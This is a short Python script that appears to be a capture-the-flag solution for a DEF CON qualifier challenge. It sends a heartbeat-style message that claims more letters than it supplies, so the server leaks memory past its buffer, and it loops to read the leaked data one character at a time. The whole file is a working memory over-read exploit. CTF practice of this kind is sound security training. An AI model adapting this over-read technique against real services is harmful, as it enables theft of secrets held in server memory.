#!/usr/bin/env python
from sc_pwn import *

target     = {'host':'xkcd_be4bf26fcb93f9ab8aa193efaad31c3b.quals.shallweplayaga.me','port':1354}

#==========
def attack(cmn, n):
    s = 'SERVER, ARE YOU STILL THERE? IF SO, REPLY "%s"()(%d LETTERS)'
    cmn.sendln(s % ('A'*0x1ff+'_', 0x200+n))
    return cmn.read_until()

#==========

if __name__=='__main__':

    i = 10
    while True:
        cmn = Communicate(target,mode='RAW')
        rsp = attack(cmn, i)
        del(cmn)
        
        if 'NICE TRY' in rsp:
            break
        print rsp.split('_')[1]
        
        i+=1
    
#==========
